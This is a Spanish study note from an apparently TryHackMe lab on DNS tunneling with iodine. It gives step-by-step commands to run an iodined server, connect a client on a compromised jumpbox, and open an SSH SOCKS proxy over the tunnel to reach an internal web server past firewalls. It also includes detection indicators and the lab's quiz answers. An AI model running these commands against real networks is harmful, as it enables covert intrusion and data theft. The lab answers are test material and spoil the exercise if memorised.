---
tags: [red-team, data-exfiltration, dns, tunneling, iodine, pivoting]
created: 2026-04-22
source: TryHackMe - Data Exfiltration
related:
  - "[[Exfiltration over DNS]]"
  - "[[DNS Configurations]]"
  - "[[Exfiltration using HTTP(S)]]"
---
# Tunneling sobre DNS

> [!abstract] TL;DR
> **DNS Tunneling** (también conocido como **IP over DNS** o **TCP over DNS**) lleva la exfiltración DNS al extremo. En lugar de transferir texto codificado, encapsula paquetes IP enteros dentro de consultas DNS. Establece un **canal de comunicación continuo y bidireccional** entre la máquina comprometida y el atacante, comportándose efectivamente como una VPN en la que todo el tráfico (SSH, HTTP, Nmap) fluye escondido en el puerto UDP 53.

## Cuándo usarlo

Es la herramienta definitiva para evadir **redes con políticas Zero-Trust o firewalls sumamente restrictivos**. Si una máquina no tiene permisos para navegar por web, enviar correos, o hacer FTP, pero **sí puede resolver nombres de dominio** (aunque sea a través del DNS interno de Active Directory), entonces el atacante puede usar esa resolución DNS para crear un túnel y pivotar hacia otras partes de la red.

La herramienta estándar de facto para esta técnica es [iodine](https://github.com/yarrick/iodine). Consiste en dos partes:
- `iodined` (El servidor demonio en la infraestructura del atacante).
- `iodine` (El cliente que ejecutamos en la víctima comprometida).

## Flujo: El Escenario de Pivoting

Supongamos que, desde la red del atacante, queremos atacar un servidor web interno (`192.168.0.100`) que no es accesible directamente desde internet. Hemos comprometido una máquina puente (*JumpBox*) que sí ve el servidor web, y que también puede resolver DNS externo.

El objetivo es crear un proxy SOCKS dinámico desde el atacante, pasando por la JumpBox, pero canalizando todo a través de DNS para burlar las restricciones del firewall intermedio.

```
┌─────────────┐       Túnel DNS (IP: 10.1.1.0/24)      ┌─────────────┐
│   ATACANTE  │ ◀════════════════════════════════════▶ │   JUMPBOX   │  (Red Interna)
│ (iodined)   │   Consultas DNS encapsulando tráfico   │  (iodine)   │ ──────▶ Servidor
│ IP: 10.1.1.1│                                        │ IP: 10.1.1.2│         Web Int.
└─────────────┘                                        └─────────────┘
      │                                                       │
      ▼                                                       ▼
 SSH -D 1080 (Proxy SOCKS local)                         Proxychains redirige tráfico
(Túnel SSH viajando sobre túnel DNS)                     hacia el servidor 192.168.0.100
```

## Ejecución paso a paso

### 1. Preparar la infraestructura DNS

Como se explica en [[DNS Configurations]], es indispensable que el atacante tenga configurados los registros `A` y `NS` de un dominio que controle para que las consultas de `iodine` lleguen a él.

Por ejemplo:
- Registro `A` para `attNS.tunnel.com` apuntando a la IP del servidor `iodined`.
- Registro `NS` para `att.tunnel.com` apuntando a `attNS.tunnel.com`.

### 2. Levantar el servidor `iodined` (Atacante)

El servidor necesita ejecutarse con privilegios elevados porque va a crear una interfaz de red virtual (`tun` o `tap`).

```shell
thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com
```

#### Desglose de parámetros:
- `-f` (Foreground): Mantiene el proceso en primer plano para ver los logs.
- `-c` (Check IP): Ignora la verificación de la IP del cliente en cada consulta. Es **esencial** si entre el atacante y la víctima hay NATs, proxies, o servidores DNS recursivos que alteren la IP origen visible.
- `-P thmpass`: La contraseña de autenticación compartida con el cliente.
- `10.1.1.1/24`: El rango de direcciones IP privadas que conformarán el "túnel" virtual. El servidor tomará la `10.1.1.1`, y asignará la `10.1.1.2` al cliente.
- `att.tunnel.com`: El subdominio delegado que atrapará el tráfico.

### 3. Conectar el cliente `iodine` (Víctima/JumpBox)

En la máquina comprometida, conectamos el cliente usando el dominio delegado.

```shell
thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com
```

Si la conexión es exitosa, se creará una interfaz virtual llamada `dns0` en ambas máquinas.

> [!info] 
> A partir de este momento, cualquier tráfico dirigido a la red `10.1.1.0/24` será envuelto en consultas DNS y desencapsulado en el otro extremo.

### 4. Pivotar: SSH Dinámico sobre el Túnel

Con el enlace virtual operando, el atacante puede abrir una sesión SSH estándar **hacia la IP virtual del cliente**, creando un Proxy SOCKS (Dynamic Port Forwarding).

```shell
root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
```

#### Desglose:
- `thm@10.1.1.2`: Usuario de la víctima y su IP en el túnel `dns0`.
- `-D 1080`: Abre un proxy SOCKS local en el atacante (`127.0.0.1:1080`).
- `-f -N`: Manda SSH a segundo plano (background) sin ejecutar un shell interactivo.
- `-4`: Fuerza el uso de IPv4.

### 5. Atacar la red interna

Finalmente, el atacante usa herramientas habituales configurándolas para salir por el proxy SOCKS. El tráfico hará el siguiente recorrido:

`Herramienta -> Proxy SSH SOCKS -> Túnel SSH -> Túnel Iodine DNS -> Víctima (JumpBox) -> Objetivo Interno`

```shell
# Usando proxychains
proxychains curl http://192.168.0.100/demo.php

# O configurando la herramienta directamente
curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
```

Si analizamos con `tcpdump` en la máquina atacante en este momento, **todo lo que veremos será un torrente de peticiones y respuestas DNS (UDP/53)** saliendo y entrando por la interfaz `eth0`.

## OPSEC y Detección

> [!warning]
> Tunneling sobre DNS es **extremadamente ruidoso**. Si bien es muy efectivo para bypass de firewalls que no hacen DPI, genera patrones que los SOC modernos identifican rápidamente:

- **Volumen inmenso:** Navegar por SSH o usar `curl` a través de DNS requiere cientos o miles de consultas por segundo.
- **Entropía máxima:** Los subdominios generados por `iodine` son cadenas aleatorias enormes (ej. `v1a2b3c4d5e6...att.tunnel.com`), muy cercanas al límite máximo de 63 caracteres por bloque.
- **Anomalía de tipos de registros:** Se observa un tráfico masivo hacia un mismo dominio empleando registros atípicos (TXT, NULL o CNAME) para transportar carga útil, en lugar de los habituales `A` o `AAAA`.
- **Firma (Fingerprint):** Herramientas como Zeek, Suricata, y EDRs especializados a menudo tienen firmas exactas para reconocer la estructura de los paquetes de `iodine` o utilidades similares como `dnscat2`.

## Comandos Clave

```shell
# Arrancar servidor (Atacante)
sudo iodined -f -c -P <pass> 10.1.1.1/24 <nombre.controlado>

# Conectar cliente (Víctima)
sudo iodine -P <pass> <nombre.controlado>

# Crear Proxy SOCKS por SSH sobre el túnel
ssh <user>@10.1.1.2 -4 -f -N -D 1080

# Usar el proxy (Ejemplo curl)
curl --socks5 127.0.0.1:1080 <url>
```

## Preguntas y Respuestas

- **Cuando se establece la conexión iodine al Attacker, ¿cuántos interfaces muestra `ifconfig` (incluyendo loopback)?**
  → `3` (Generalmente loopback `lo`, la física `eth0`, y la virtual `dns0`).
- **¿Cómo se llama la interfaz de red creada por iodined?**
  → `dns0`
- **Usá el túnel DNS para probar acceso a `http://192.168.0.100/test.php`. ¿Cuál es la flag?**
  → Una vez establecido `iodine` y abierto el puerto `-D 1080` vía SSH: `curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php`